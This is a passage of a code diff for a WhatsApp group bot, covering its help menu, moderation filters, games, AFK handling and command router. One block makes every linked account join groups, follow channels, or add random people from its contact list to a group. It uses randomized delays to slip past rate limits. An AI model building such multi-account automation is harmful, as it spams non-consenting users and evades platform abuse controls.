+                    `.mute @user — silence a specific user\n` +
+                    `.unmute @user — restore their voice\n` +
+                    `.tagall — tag all members\n` +
+                    `.hidetag — tag all silently\n` +
+                    `.admins — tag all admins\n` +
+                    `.welcome on/off — welcome message for new members\n` +
+                    `.goodbye on/off — goodbye message for leaving members\n` +
+                    `.groupinfo — group details\n` +
+                    `.adminlist — list all admins\n` +
+                    `.membercount — number of members\n` +
+                    `.link — get group invite link\n` +
+                    `.revoke — reset invite link\n` +
+                    `.mode owner/public — public or owner-only mode\n` +
+                    `.broadcast <mins> <msg> — send to all groups on interval\n` +
+                    `.stopbroadcast — stop broadcast\n` +
+                    `.schedule HH:MM <msg> — schedule daily message\n` +
+                    `.persona — set bot personality\n` +
+                    `.setpp — set menu banner image\n` +
+                    `.setwpp — set WhatsApp profile picture\n` +
+                    `.sticker — convert image to sticker\n` +
+                    `.toimg — convert sticker to image\n` +
+                    `.ocr — extract text from image\n` +
+                    `.translate <text> — translate text\n` +
+                    `.weather <city> — weather info\n` +
+                    `.tts <text> — text to speech\n` +
+                    `.lyrics <song> — get song lyrics\n` +
+                    `.song <name> — download song\n` +
+                    `.imagine <prompt> — AI image generation\n` +
+                    `.solve — solve a question (text or image)\n` +
+                    `.truth / .dare — truth or dare game\n` +
+                    `.ttt — tic-tac-toe\n` +
+                    `.cmdlock — lock/unlock commands for premium\n` +
+                    `.premiumadd / .premiumremove — manage premium users`;
+                try {
+                    const aiReply = await callAI(rawBody, { system: helpSystem, temperature: 0.85 });
+                    await reply(`🤖 *Phantom Help:*\n\n${aiReply}`);
+                } catch (e) {
+                    await reply(buildOmegaTerminal(
+                        `   ❌  *AI_ORACLE — OFFLINE*\n\n` +
+                        `   The help AI couldn't respond right now.\n\n` +
+                        `   *Possible reasons:*\n` +
+                        `   • No GEMINI_API_KEY / GOOGLE_API_KEY set in your environment\n` +
+                        `   • AI service is temporarily down\n` +
+                        `   • Network issue on your server\n\n` +
+                        `   *Fix:* Add GEMINI_API_KEY (or GOOGLE_API_KEY) to your environment\n` +
+                        `   Get a free key: aistudio.google.com\n\n` +
+                        `   _Type *.help* to turn off help mode._`
+                    ));
+                }
+                return;
+            }
+        }
+
+        // --- BUTTON TEST callback interceptor ---
+        if (buttonId && buttonId.startsWith("btnt_")) {
+            const eventTypeLabel = type || getContentType(content) || 'unknown';
+            await emitButtonTrace(sock, 'callback', {
+                test: buttonId.split('_').slice(1, 2)[0] || 'unknown',
+                eventType: eventTypeLabel,
+                id: buttonId,
+                reason: 'button/list callback received',
+                body: rawBody || '',
+            });
+            try {
+                await sock.sendMessage(from, {
+                    text: buildOmegaTerminal(
+                        `   🧪 *BUTTON_TEST_CALLBACK*\n\n` +
+                        `   • Event: *${eventTypeLabel}*\n` +
+                        `   • ID: *${buttonId}*\n` +
+                        `   • Body: ${String(rawBody || '').slice(0, 120) || '_none_'}\n\n` +
+                        `   _This proves the tapped control returned a callback._`
+                    )
+                }, { quoted: msg });
+            } catch (_) {
+                try { await sock.sendMessage(from, { text: `🧪 Button callback ok\nEvent: ${eventTypeLabel}\nID: ${buttonId}` }); } catch (_) {}
+            }
+            return;
+        }
+
+        // --- MENU NAVIGATION interceptor (tap-able 3-panel menu) ---
+        if (buttonId && (
+            buttonId.startsWith("menu_") || buttonId.startsWith("owner_") ||
+            buttonId.startsWith("group_") || buttonId.startsWith("dev_") ||
+            buttonId.startsWith("bug_") || buttonId.startsWith("fun_") ||
+            buttonId.startsWith("test_") ||
+            buttonId === "back_to_main"
+        )) {
+            const isDev = msg.key.fromMe || isDevJid(senderJid);
+            await handleMenuNavigation(sock, from, msg, buttonId, isDev);
+            return;
+        }
+
+        // --- SESSION CMD STATE interceptor ---
+        {
+            const sessKey = `${senderJid}::${from}`;
+            const sessState = sessionCmdState[sessKey];
+            if (sessState && !msg.key.fromMe && (buttonId.startsWith("sess_") || (rawBody && !rawBody.startsWith(".")))) {
+                // buttonId like "sess_a" → extract "a"; otherwise use typed text
+                const input = buttonId.startsWith("sess_") ? buttonId.replace("sess_", "") : rawBody.trim();
+                if (sessState.step === "action") {
+                    const choice = input.toLowerCase();
+                    if (choice === "a" || choice === "b" || choice === "c") {
+                        if (choice === "a") { sessState.action = "join"; sessState.step = "link"; }
+                        else if (choice === "b") { sessState.action = "follow"; sessState.step = "link"; }
+                        else { sessState.action = "addcontacts"; sessState.step = "count"; }
+                        if (sessState.step === "link") {
+                            await sock.sendMessage(from, {
+                                text: sessState.action === "join"
+                                    ? `🔗 Send me the *group invite link* now.\n_(e.g. https://chat.whatsapp.com/XXXX)_`
+                                    : `📡 Send me the *channel link* now.\n_(e.g. https://whatsapp.com/channel/XXXX)_`
+                            });
+                        } else {
+                            await sock.sendMessage(from, { text: `🔢 How many contacts should each session add?\n\nReply with a number (e.g. *3*).\n_Each linked number will pick that many contacts from their own contact list and add them to a group._` });
+                        }
+                    } else {
+                        await sock.sendMessage(from, { text: `⚠️ Reply *A* to join a group, *B* to follow a channel, or *C* to add contacts to a group.` });
+                    }
+                } else if (sessState.step === "count") {
+                    const count = parseInt(input.trim());
+                    if (!count || count < 1 || count > 50) {
+                        await sock.sendMessage(from, { text: `⚠️ Please reply with a valid number between 1 and 50.` });
+                    } else {
+                        sessState.count = count;
+                        sessState.step = "link";
+                        await sock.sendMessage(from, { text: `✅ Each session will add *${count}* contact(s).\n\n🔗 Now send the *group invite link*:\n_(e.g. https://chat.whatsapp.com/XXXX)_` });
+                    }
+                } else if (sessState.step === "link") {
+                    delete sessionCmdState[sessKey];
+                    const link = input;
+                    const socks = Object.values(activeSockets).filter(s => s?.user?.id);
+                    if (!socks.length) { await sock.sendMessage(from, { text: "❌ No active sessions found." }); return; }
+                    await sock.sendMessage(from, { text: `⏳ Processing ${socks.length} session(s)...` });
+
+                    // Resolve group JID once if needed (for addcontacts)
+                    let destJid = null;
+                    if (sessState.action === "addcontacts" || sessState.action === "join") {
+                        const code = link.split("chat.whatsapp.com/")[1]?.split(/[?# ]/)[0]?.trim();
+                        if (!code && sessState.action === "addcontacts") {
+                            await sock.sendMessage(from, { text: "❌ Invalid group link." }); return;
+                        }
+                        if (code) {
+                            try { const info = await socks[0].groupGetInviteInfo(code); destJid = info?.id; } catch (_) {}
+                        }
+                    }
+
+                    for (const s of socks) {
+                        // Safety: skip dead sockets
+                        if (!s.user?.id) continue;
+                        const num = (s.user.id || "").split(":")[0].split("@")[0];
+                        try {
+                            if (sessState.action === "join") {
+                                const code = link.split("chat.whatsapp.com/")[1]?.split(/[?# ]/)[0]?.trim();
+                                if (!code) { await sock.sendMessage(from, { text: `❌ ${num}: Invalid group link` }); continue; }
+                                await s.groupAcceptInvite(code);
+                                await sock.sendMessage(from, { text: `✅ ${num}: Joined group (via invite link)` });
+                            } else if (sessState.action === "follow") {
+                                const chanCode = link.split("whatsapp.com/channel/")[1]?.split(/[?# ]/)[0]?.trim();
+                                if (!chanCode) { await sock.sendMessage(from, { text: `❌ ${num}: Invalid channel link` }); continue; }
+                                const chanJid = chanCode + "@newsletter";
+                                try {
+                                    await s.newsletterFollow(chanJid);
+                                    await sock.sendMessage(from, { text: `✅ ${num}: Followed channel` });
+                                } catch {
+                                    await sock.sendMessage(from, { text: `✅ ${num}: Attempted channel follow` });
+                                }
+                            } else if (sessState.action === "addcontacts") {
+                                if (!destJid) { await sock.sendMessage(from, { text: `❌ ${num}: Could not resolve group` }); continue; }
+                                // Get contacts from this session's store
+                                const contactJids = Object.keys(s.store?.contacts || {})
+                                    .filter(j => j.endsWith("@s.whatsapp.net") && j !== s.user.id);
+                                if (!contactJids.length) { await sock.sendMessage(from, { text: `⚠️ ${num}: No contacts found` }); continue; }
+                                // Pick N random contacts
+                                const picks = contactJids.sort(() => Math.random() - 0.5).slice(0, sessState.count);
+                                let added = 0, failed = 0;
+                                for (const jid of picks) {
+                                    try {
+                                        const res = await s.groupParticipantsUpdate(destJid, [jid], "add");
+                                        const st = Array.isArray(res) ? String(res[0]?.status || "200") : "200";
+                                        if (st === "200" || st === "200") added++;
+                                        else failed++;
+                                    } catch { failed++; }
+                                    await new Promise(r => setTimeout(r, 800));
+                                }
+                                await sock.sendMessage(from, { text: `✅ ${num}: Added *${added}* contacts (${failed} failed)` });
+                            }
+                        } catch (e) {
+                            await sock.sendMessage(from, { text: `❌ ${num}: ${e?.message || "failed"}` });
+                        }
+                        // Human-like delay between sessions (3-5s) to avoid rate-limits & disconnects
+                        await new Promise(r => setTimeout(r, 3000 + Math.floor(Math.random() * 2000)));
+                    }
+                    await sock.sendMessage(from, { text: `✅ *Done!* All sessions processed.` });
+                }
+                return;
+            }
+        }
+
+        // --- PREMIUM CHECK — only blocks if dev has explicitly .lock'd a command ---
+        // Otherwise everyone gets every command. Premium system stays available via .lock/.unleash.
+        if (!msg.key.fromMe && !isDevJid(senderJid) && rawBody?.startsWith(".")) {
+            const cmdWord = rawBody.trim().split(" ")[0].toLowerCase();
+            const premData = loadPremium();
+            const lockedCmds = Object.keys(premData.unlocked_cmds || {})
+                .concat(Object.keys(premData.locked_for || {}));
+            const isCmdGated = lockedCmds.includes(cmdWord);
+            if (isCmdGated && !hasPremiumAccess(senderJid, cmdWord)) {
+                await sock.sendMessage(from, {
+                    text:
+                        `🔒 *${cmdWord}* is currently restricted.\n` +
+                        `Please contact the developer for access.`
+                }, { quoted: msg });
+                return;
+            }
+        }
+
+        // --- AUTO-REACT (runs on every group message before filtering) ---
+        if (isGroup && !msg.key.fromMe) {
+            const reactGroups = loadAutoReact();
+            if (reactGroups[from]) {
+                const emoji = reactGroups[from] === "random"
+                    ? AUTO_REACT_EMOJIS[Math.floor(Math.random() * AUTO_REACT_EMOJIS.length)]
+                    : reactGroups[from];
+                try {
+                    await sock.sendMessage(from, { react: { text: emoji, key: msg.key } });
+                } catch (_) {}
+            }
+        }
+
+        // --- ACTIVE GAME MOVE DETECTION (runs before trigger filter) ---
+        if (isGroup && rawBody && !msg.key.fromMe) {
+            const game = gameState[from];
+            if (game?.type === "ttt") {
+                const move = parseInt(rawBody.trim());
+                if (move >= 1 && move <= 9) {
+                    const idx = move - 1;
+                    const currentPlayer = game.players[game.turn % 2];
+                    if (senderJid !== currentPlayer) {
+                        // Not your turn
+                    } else if (game.board[idx] !== "") {
+                        await reply("❌ That spot is taken. Pick another number 1-9.");
+                    } else {
+                        const mark = game.turn % 2 === 0 ? "X" : "O";
+                        game.board[idx] = mark;
+                        game.turn++;
+                        if (checkTTTWin(game.board, mark)) {
+                            await sock.sendMessage(from, {
+                                text: `${renderTTTBoard(game.board)}\n\n🎉 @${senderJid.split("@")[0]} wins! 🏆`,
+                                mentions: [senderJid],
+                            });
+                            delete gameState[from];
+                        } else if (game.board.every(c => c !== "")) {
+                            await reply(`${renderTTTBoard(game.board)}\n\n🤝 It's a draw!`);
+                            delete gameState[from];
+                        } else {
+                            let next = game.players[game.turn % 2];
+                            
+                            // If the next player is the BOT, calculate and make the move instantly!
+                            if (next === "BOT") {
+                                const mark = game.turn % 2 === 0 ? "X" : "O";
+                                const botIdx = tttBestBotMove(game.board);
+                                game.board[botIdx] = mark;
+                                game.turn++;
+                                
+                                if (checkTTTWin(game.board, mark)) {
+                                    await sock.sendMessage(from, {
+                                        text: `${renderTTTBoard(game.board)}\n\n🤖 Phantom-X wins! 💀`,
+                                    });
+                                    delete gameState[from];
+                                } else if (game.board.every(c => c !== "")) {
+                                    await reply(`${renderTTTBoard(game.board)}\n\n🤝 It's a draw!`);
+                                    delete gameState[from];
+                                } else {
+                                    next = game.players[game.turn % 2];
+                                    await sock.sendMessage(from, {
+                                        text: `${renderTTTBoard(game.board)}\n\n🤖 The bot played!\n👉 @${next.split("@")[0]}'s turn (${game.turn % 2 === 0 ? "❌" : "⭕"})`,
+                                        mentions: [next],
+                                    });
+                                }
+                            } else {
+                                await sock.sendMessage(from, {
+                                    text: `${renderTTTBoard(game.board)}\n\n👉 @${next.split("@")[0]}'s turn (${game.turn % 2 === 0 ? "❌" : "⭕"})`,
+                                    mentions: [next],
+                                });
+                            }
+                        }
+                    }
+                    return;
+                }
+            }
+            if (game?.type === "wordchain") {
+                const word = rawBody.trim().toLowerCase().replace(/[^a-z]/g, "");
+                if (word.length > 0) {
+                    const lastLetter = game.lastWord?.slice(-1);
+                    if (lastLetter && word[0] !== lastLetter) {
+                        await reply(`❌ Word must start with *${lastLetter.toUpperCase()}*. Try again!`);
+                    } else if (game.usedWords?.includes(word)) {
+                        await reply(`❌ *${word}* already used! Pick a different word.`);
+                    } else {
+                        if (!game.usedWords) game.usedWords = [];
+                        game.usedWords.push(word);
+                        game.lastWord = word;
+                        game.lastPlayer = senderJid;
+                        const nextLetter = word.slice(-1).toUpperCase();
+                        await reply(`✅ *${word.toUpperCase()}* — Next word must start with *${nextLetter}*`);
+                    }
+                    return;
+                }
+            }
+        }
+
+        // --- TRIGGER FILTER ---
+        const triggerChars = ['.', ',', '?'];
+        const trimmedBody = rawBody.trimStart();
+        const hasTrigger = trimmedBody && triggerChars.some(c => trimmedBody.startsWith(c));
+        const hasHidetagAnywhere = rawBody && rawBody.split('\n').some(l => l.trim().toLowerCase().startsWith('.hidetag'));
+
+        // Button taps (buttonId is set) must ALWAYS pass through — never block them
+        // For ALL text: only respond to trigger-prefixed commands (like .ping)
+        // If it doesn't have a trigger (.,?) and it's not a button or hidetag, we skip it entirely so the bot doesn't reply to normal conversation!
+        if (!buttonId && !hasTrigger && !hasHidetagAnywhere) {
+            const game = gameState[from];
+            if (!game) {
+                // console.log("[Block] Blocked by trigger filter");
+                return;
+            }
+        }
+        
+        // In DMs from other people: skip entirely (this bot only works in groups or owner DMs)
+        if (!buttonId && !isGroup && !isSelfChat && !msg.key.fromMe) return;
+
+        // --- BOT MODE ENFORCEMENT ---
+        if (currentMode === "owner" && !msg.key.fromMe && !isSelfChat) {
+            if (DEBUG_RUNTIME && isGroup && rawBody && /^[.,?]/.test(String(rawBody).trimStart())) {
+                debugLog(`[GroupCmd] blocked by owner mode from=${from} sender=${senderJid || "?"} body=${String(rawBody).trim().slice(0, 120)}`);
+            }
+            if (isGroup && rawBody && /^[.,?]/.test(String(rawBody).trimStart())) {
+                await emitGroupTrace(sock, 'handle-drop-owner-mode', {
+                    eventType: type,
+                    jid: from,
+                    sender: senderJid || from,
+                    fromMe: msg.key.fromMe,
+                    rawBody,
+                    reason: 'blocked by owner mode gate',
+                });
+            }
+            return;
+        }
+
+        // --- BAN CHECK (bot-level, skip if banned) ---
+        if (!msg.key.fromMe && botJid && isBanned(botJid, senderJid)) return;
+
+        // --- GROUP PROTECTION (runs on every group message) ---
+        if (isGroup) {
+            const anyAntiOn =
+                getGroupSetting(from, "antilink") ||
+                getGroupSetting(from, "antispam") ||
+                getGroupSetting(from, "antibot") ||
+                getGroupSetting(from, "antimention");
+
+            let roles = { admins: new Set(), botIsAdmin: false };
+            if (anyAntiOn) roles = await getGroupRoles(sock, from);
+
+            // Build the full set of JIDs the sender might be known by (phone + lid + display).
+            // This is critical: modern WA can hand the same user a @lid and @s.whatsapp.net id,
+            // and admin/dev checks must succeed against ANY of them.
+            const senderJidCandidates = getSenderJids(msg);
+            if (!senderJidCandidates.includes(senderJid)) senderJidCandidates.unshift(senderJid);
+
+            const senderIsAdmin = isJidAdmin(senderJidCandidates, roles.admins);
+            const senderIsDev = senderJidCandidates.some(j => isDevJid(j));
+            const skipForSender = msg.key.fromMe || senderIsAdmin || senderIsDev;
+
+            // Pick the JID format that actually exists in participants — that's what
+            // groupParticipantsUpdate("remove", ...) needs, and it's the one mentions resolve to.
+            const matchedAdminJid = roles.meta?.participants?.find(p => isSameUser(p.id, senderJid))?.id;
+            const removalJid = matchedAdminJid || senderJid;
+            const mentionTagBase = jidLocal(removalJid);
+
+            // Anti-link
+            if (getGroupSetting(from, "antilink") && !skipForSender) {
+                // Check rawBody AND any embedded text in the message
+                const allText = [rawBody];
+                try {
+                    const ctx = msg.message?.extendedTextMessage?.contextInfo;
+                    if (ctx?.quotedMessage) {
+                        const qType = getContentType(ctx.quotedMessage);
+                        if (qType === "conversation" && ctx.quotedMessage.conversation) allText.push(ctx.quotedMessage.conversation);
+                        if (qType === "extendedTextMessage" && ctx.quotedMessage.extendedTextMessage?.text) allText.push(ctx.quotedMessage.extendedTextMessage.text);
+                    }
+                } catch (_) {}
+                const hasLink = allText.some(t => t && containsLink(t));
+                if (hasLink) {
+                    if (!roles.botIsAdmin) {
+                        console.log(`[antilink] cannot enforce in ${from} — bot is not admin`);
+                        await sock.sendMessage(from, { text: `⚠️ @${mentionTagBase}, links are not allowed here! (Bot is not admin — cannot delete)`, mentions: [removalJid] });
+                    } else {
+                        try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
+                        const alWarnCount = addWarn(from, removalJid);
+                        if (alWarnCount >= 3) {
+                            resetWarns(from, removalJid);
+                            try { await sock.groupParticipantsUpdate(from, [removalJid], "remove"); } catch (_) {}
+                            await sock.sendMessage(from, { text: `🚫 @${mentionTagBase} has been kicked — 3 antilink warnings!`, mentions: [removalJid] });
+                        } else {
+                            await sock.sendMessage(from, {
+                                text: `⚠️ @${mentionTagBase}, links are not allowed here!\n⚠️ Warning *${alWarnCount}/3* — 3 warnings = kick.`,
+                                mentions: [removalJid],
+                            });
+                        }
+                        return;
+                    }
+                }
+            }
+
+            // Anti-spam
+            if (getGroupSetting(from, "antispam") && rawBody && !skipForSender) {
+                if (isSpamming(senderJid)) {
+                    if (!roles.botIsAdmin) {
+                        console.log(`[antispam] cannot enforce in ${from} — bot is not admin`);
+                    } else {
+                        try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
+                        const asWarnCount = addWarn(from, removalJid);
+                        if (asWarnCount >= 3) {
+                            resetWarns(from, removalJid);
+                            try { await sock.groupParticipantsUpdate(from, [removalJid], "remove"); } catch (_) {}
+                            await sock.sendMessage(from, { text: `🚫 @${mentionTagBase} has been kicked — 3 antispam warnings!`, mentions: [removalJid] });
+                        } else {
+                            await sock.sendMessage(from, {
+                                text: `🚫 @${mentionTagBase}, slow down! Warning *${asWarnCount}/3* — 3 = kick.`,
+                                mentions: [removalJid],
+                            });
+                        }
+                        return;
+                    }
+                }
+            }
+
+            // Anti-mention (5+ mentions in one message = warn / kick)
+            if (getGroupSetting(from, "antimention") && containsMassMention(msg) && !skipForSender) {
+                if (!roles.botIsAdmin) {
+                    console.log(`[antimention] cannot enforce in ${from} — bot is not admin`);
+                } else {
+                    try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
+                    const amWarnCount = addWarn(from, removalJid);
+                    if (amWarnCount >= 3) {
+                        resetWarns(from, removalJid);
+                        try { await sock.groupParticipantsUpdate(from, [removalJid], "remove"); } catch (_) {}
+                        await sock.sendMessage(from, { text: `🚫 @${mentionTagBase} has been kicked — 3 antimention warnings!`, mentions: [removalJid] });
+                    } else {
+                        await sock.sendMessage(from, {
+                            text: `📢 @${mentionTagBase}, mass-mentions are not allowed!\n⚠️ Warning *${amWarnCount}/3* — 3 = kick.`,
+                            mentions: [removalJid],
+                        });
+                    }
+                    return;
+                }
+            }
+
+            // Anti-bot — only kicks if the participant is clearly an automated newsletter / channel JID,
+            // never on @lid (which is now used for many normal users).
+            if (getGroupSetting(from, "antibot") && !msg.key.fromMe && !senderIsAdmin) {
+                const looksAutomated = senderJid.endsWith("@newsletter") || senderJid.endsWith("@broadcast");
+                if (looksAutomated && roles.botIsAdmin) {
+                    try { await sock.groupParticipantsUpdate(from, [removalJid], "remove"); } catch (_) {}
+                    await sock.sendMessage(from, { text: `🤖 Automated account removed — anti-bot protection active.` });
+                    return;
+                }
+            }
+
+            // T11: bump message-count stats per group (non-bot messages with text)
+            if (!msg.key.fromMe && rawBody) bumpStat(from, senderJid);
+
+            // T10: AFK auto-clear when AFK user talks
+            if (!msg.key.fromMe && getAfk(senderJid) && rawBody && !rawBody.toLowerCase().startsWith(".afk")) {
+                const a = getAfk(senderJid);
+                clearAfk(senderJid);
+                const dur = Math.round((Date.now() - a.since) / 60000);
+                await sock.sendMessage(from, { text: `👋 Welcome back @${senderJid.split("@")[0]} — you were AFK for ${dur} min.`, mentions: [senderJid] }, { quoted: msg });
+            }
+
+            // T10: notify if someone mentioned an AFK user
+            if (!msg.key.fromMe) {
+                const ctx = msg.message?.extendedTextMessage?.contextInfo;
+                const mentioned = (Array.isArray(ctx?.mentionedJid) ? ctx.mentionedJid : [])
+                    .concat(ctx?.participant ? [ctx.participant] : []);
+                const seen = new Set();
+                for (const m of mentioned) {
+                    if (seen.has(m)) continue; seen.add(m);
+                    const a = getAfk(m);
+                    if (a) {
+                        const dur = Math.round((Date.now() - a.since) / 60000);
+                        await sock.sendMessage(from, { text: `💤 @${m.split("@")[0]} is AFK (${dur}m ago)\nReason: ${a.reason}`, mentions: [m] }, { quoted: msg });
+                    }
+                }
+            }
+
+            // Slowmode enforcement
+            const slowSecs = getGroupSetting(from, "slowmode_seconds") || 0;
+            if (slowSecs > 0 && !msg.key.fromMe && rawBody && !isDevJid(senderJid)) {
+                if (!global.__slowMap) global.__slowMap = {};
+                const key = `${from}|${senderJid}`;
+                const last = global.__slowMap[key] || 0;
+                const now = Date.now();
+                if (now - last < slowSecs * 1000) {
+                    const r2 = await getGroupRoles(sock, from);
+                    if (r2.botIsAdmin && !r2.admins.has(senderJid)) {
+                        try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
+                        return;
+                    }
+                }
+                global.__slowMap[key] = now;
+            }
+
+            // Auto-reply keywords + "phantom" trigger (for incoming group messages)
+            if (!msg.key.fromMe && rawBody) {
+                const lowerBody = rawBody.toLowerCase();
+                // Phantom → send menu (non-owner, so isDev=false — dev sections stay hidden)
+                if (lowerBody.includes("phantom")) {
+                    await sock.sendMessage(from, { text: buildMenuText(currentMode, getMenuTheme(botJid), false) }, { quoted: msg });
+                    return;
+                }
+                // Arise → uptime (no dot needed)
+                if (lowerBody === "arise" || lowerBody.startsWith("arise ")) {
+                    const mu = process.memoryUsage();
+                    const heapU = (mu.heapUsed / 1024 / 1024).toFixed(0);
+                    const heapT = (mu.heapTotal / 1024 / 1024).toFixed(0);
+                    const rss   = (mu.rss / 1024 / 1024).toFixed(0);
+                    await sock.sendMessage(from, { text: buildOmegaTerminal(
+                        `   ┌── *TEMPORAL LOGS* ──┐\n` +
+                        `   ╿\n` +
+                        `   ┝  *ACTIVE* : ${formatUptime()}\n` +
+                        `   ┝  *HEAP* : ${heapU}MB / ${heapT}MB\n` +
+                        `   ┝  *RSS* : ${rss}MB\n` +
+                        `   ┝  *PID* : ${process.pid}\n` +
+                        `   ╿\n` +
+                        `   └── *STABILITY: OPERATIONAL* ──┘\n\n` +
+                        `   " *I have survived the collapse.*\n     *My pulse keeps this realm*\n     *from drifting into the void.* "`
+                    )}, { quoted: msg });
+                    return;
+                }
+                // Custom keywords
+                const keywords = loadAutoReply();
+                for (const [kw, rep] of Object.entries(keywords)) {
+                    if (lowerBody.includes(kw.toLowerCase())) {
+                        await sock.sendMessage(from, { text: rep }, { quoted: msg });
+                        return;
+                    }
+                }
+            }
+        }
+
+        let body = rawBody;
+        if (!body) return;
+
+        // Handle .readmore appearing ANYWHERE in the message
+        if (body.toLowerCase().includes('.readmore')) {
+            const lines = body.split('\n');
+            const out = [];
+            let changed = false;
+            for (const line of lines) {
+                const idx = line.toLowerCase().indexOf('.readmore');
+                if (idx === -1) {
+                    out.push(line);
+                    continue;
+                }
+                changed = true;
+                const beforeText = line.slice(0, idx).trim();
+                const afterText = line.slice(idx + '.readmore'.length).trim();
+                const hiddenPadding = '\n'.repeat(700);
+                out.push(`${beforeText || ''}${hiddenPadding}${afterText || ''}`);
+            }
+            if (changed) {
+                await sock.sendMessage(from, { text: out.join('\n') }, { quoted: msg });
+                return;
+            }
+        }
+
+        // Handle .hidetag appearing on any line (before or after a message)
+        const bodyLines = body.trim().split('\n');
+        const hidetagLineIdx = bodyLines.findIndex(l => l.trim().toLowerCase().startsWith('.hidetag'));
+        if (isGroup && hidetagLineIdx !== -1) {
+            try {
+                const meta = await sock.groupMetadata(from);
+                const members = meta.participants.map(p => p.id);
+                const otherText = bodyLines.filter((_, i) => i !== hidetagLineIdx).join('\n').trim();
+                // Invisible tag: mentions all members but shows no @numbers in text
+                const invisibleText = otherText || '\u200e';
+                await sock.sendMessage(from, {
+                    text: invisibleText,
+                    mentions: members,
+                }, { quoted: msg });
+            } catch (e) {
+                await reply(`❌ Failed to hidetag: ${e?.message || "error"}`);
+            }
+            return;
+        }
+
+        // ─────────────────────────────────────────────────────────────────────
+        // NATURAL-LANGUAGE ROUTER — "hey eclipse menu", "astraea ping", etc.
+        // Pattern-match common intents first; Gemini fallback only if API key set.
+        // Rewrites `body` to a normal `.command` and lets the switch handle it.
+        // ─────────────────────────────────────────────────────────────────────
+        const NL_TRIGGER = /^\s*(hey\s+|yo\s+|ok\s+|hi\s+)?(eclipse|astraea|phantom)[\s,:!.\-]+/i;
+        if (body && !body.startsWith(".") && !body.startsWith(",") && !body.startsWith("?") && NL_TRIGGER.test(body)) {
+            const intent = body.replace(NL_TRIGGER, "").trim();
+            const lc = intent.toLowerCase();
+            let resolved = null;
+            if (!intent) {
+                resolved = ".menu"; // bare "hey eclipse" → menu
+            } else if (/^(menu|home|main|show.*menu|whats? up|what can you do|help|commands?)$/i.test(lc)) {
+                resolved = ".menu";
+            } else if (/(switch|become|turn into|change).*(eclipse|astraea)/i.test(lc) || /^(be|use)\s+(eclipse|astraea)/i.test(lc)) {
+                resolved = lc.includes("astraea") ? ".persona astraea" : ".persona eclipse";
+            } else if (/(chains|chain.*order|group.*menu|group.*command)/i.test(lc)) {
+                resolved = ".chains";
+            } else if (/(codex|book.*life|log.*menu|log.*command)/i.test(lc)) {
+                resolved = ".codex";
+            } else if (/(ascend|premium|ascension|rite)/i.test(lc)) {
+                resolved = ".ascend";
+            } else if (/(flare|emergency|solar|panic)/i.test(lc)) {
+                resolved = ".flare";
+            } else if (/(abyss|owner.*menu|all[ -]?seeing)/i.test(lc)) {
+                resolved = ".abyss";
+            } else if (/^ping/i.test(lc) || /are you (alive|there|up|on)/i.test(lc)) {
+                resolved = ".ping";
+            } else if (/(pl.*table|league.*table|standings?)/i.test(lc)) {
+                resolved = ".pltable";
+            } else if (/(live.*scor|live.*match|whats? on now)/i.test(lc)) {
+                resolved = ".live";
+            } else if (/(this week|week.*match|this[\s-]?weeks? game)/i.test(lc)) {
+                resolved = ".plweek";
+            }
+
+            // Gemini fallback when no pattern matches
+            if (!resolved && (process.env.GEMINI_API_KEY || process.env.GOOGLE_API_KEY) && intent.length <= 200) {
+                try {
+                    const sys = "You map a user's free-form request to ONE WhatsApp bot command from this list. Reply with ONLY the command (with leading dot), no explanation. If nothing fits, reply NONE.\n\nCommands:\n.menu — main menu\n.chains — group commands\n.codex — log/system commands\n.ascend — premium commands\n.flare — emergency commands\n.abyss — owner commands\n.ping — health check\n.persona eclipse — switch to dark persona\n.persona astraea — switch to golden persona\n.pltable — Premier League table\n.live — live PL scores\n.plweek — this week's PL matches\n.fixtures <club> — club fixtures (include club name)\n.h2h <a> vs <b> — head to head";
+                    const out = await callGemini(intent, { system: sys, temperature: 0.2 });
+                    const first = (out || "").trim().split("\n")[0].trim();
+                    if (first && first !== "NONE" && first.startsWith(".")) resolved = first;
+                } catch (_) { /* ignore — graceful fallback */ }
+            }
+
+            if (resolved) {
+                body = resolved;
+                try { await sock.sendPresenceUpdate("composing", from); } catch (_) {}
+            }
+        }
+
+        const parts = body.trim().split(" ");
+        let cmd = parts[0].toLowerCase();
+        if (isGroup && body && /^[.,?]/.test(String(body).trimStart())) {
+            await emitGroupTrace(sock, 'handle-cmd-parsed', {
+                eventType: type,
+                jid: from,
+                sender: senderJid || from,
+                fromMe: msg.key.fromMe,
+                rawBody: body,
+                reason: `parsed command ${cmd}`,
+            });
+        }
+        // Normalize , and ? prefix → . so users can use any of the three trigger chars
+        if (cmd.length > 1 && (cmd.startsWith(',') || cmd.startsWith('?'))) {
+            cmd = '.' + cmd.slice(1);
+        }
+        // --- ALIAS RESOLUTION ---
+        const aliases = loadAliases();
+        if (aliases[cmd]) {
+            const aliasTarget = aliases[cmd];
+            body = aliasTarget + (parts.slice(1).length ? " " + parts.slice(1).join(" ") : "");
+            const reParts = body.trim().split(" ");
+            cmd = reParts[0].toLowerCase();
+        }
+
+        // --- TYPO SUGGESTION INTERCEPTOR — runs before switch so confirmed suggestion can fall into it ---
+        {
+            const typoKey = `${senderJid}::${from}`;
+            const typoState = typoSuggestionState[typoKey];
+            if (typoState && (buttonId === "typo_yes" || buttonId === "typo_no" || (rawBody && !rawBody.startsWith(".")))) {
+                const isConfirm = buttonId === "typo_yes" || ["yes", "y", "1"].includes(rawBody.trim().toLowerCase());
+                delete typoSuggestionState[typoKey];
+                if (isConfirm) {
+                    // Re-route to suggested command — fall through to switch below
+                    rawBody = typoState.rawBody;
+                    body = typoState.rawBody;
+                    parts = typoState.parts;
+                    cmd = typoState.cmd;
+                } else {
+                    // User dismissed the suggestion (or tapped "no" button)
+                    return;
+                }
+            }
+        }
+
+        // --- ON/OFF CORRECTION interceptor (tapped from replyBadOnOff list) ---
+        // buttonId format: "onoff_.antilink_on" or "onoff_.antilink_off"
+        if (buttonId && buttonId.startsWith("onoff_")) {
+            const withoutPrefix = buttonId.slice("onoff_".length);
+            const lastUnderscore = withoutPrefix.lastIndexOf("_");
+            const onoffCmd = withoutPrefix.slice(0, lastUnderscore);
+            const onoffVal = withoutPrefix.slice(lastUnderscore + 1);
+            if (["on", "off"].includes(onoffVal) && onoffCmd.startsWith(".")) {
+                body = `${onoffCmd} ${onoffVal}`;
+                parts.length = 0;
+                body.split(" ").forEach(p => parts.push(p));
